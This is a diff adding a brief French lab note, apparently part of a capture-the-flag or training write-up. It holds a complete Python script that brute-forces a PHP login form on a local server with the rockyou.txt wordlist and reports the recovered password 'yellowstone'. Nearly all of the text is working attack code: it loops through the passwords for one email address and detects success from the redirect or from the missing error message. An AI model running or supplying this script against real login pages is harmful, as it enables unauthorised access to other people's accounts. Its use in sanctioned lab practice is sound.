@@ -1,0 +1,34 @@
+Bruteforce avec un script Python et la wordlist rockyou.txt qui a donné le mdp yellowstone :
+
+pip install requests
+
+import requests
+
+url = "http://127.0.0.1:8004/index.php/"
+wordlist_user = ["johndoe@gmail.com"]
+
+# Ouvre le fichier rockyou.txt (assure-toi qu'il est décompressé)
+with open("rockyou.txt", "r", encoding="latin-1") as f:
+    wordlist_pass = f.read().splitlines()
+
+for email in wordlist_user:
+    for password in wordlist_pass:
+        data = {
+            "email": email,
+            "password": password
+        }
+        response = requests.post(url, data=data, allow_redirects=False)
+
+        print(f"Test de {email}:{password} -> Code {response.status_code}")
+
+        # Si redirection vers profil.php, succès
+        if response.status_code == 302 and "Location" in response.headers and "profil.php" in response.headers["Location"]:
+            print(f"[+] Succès ! Identifiants valides : {email} / {password}")
+            exit()
+
+        # Autre méthode si pas d'erreur visible dans le HTML
+        if "Email ou mot de passe incorrect" not in response.text:
+            print(f"[+] Succès (pas d'erreur visible) : {email} / {password}")
+            exit()
+
+print("[-] Aucun mot de passe valide trouvé.")
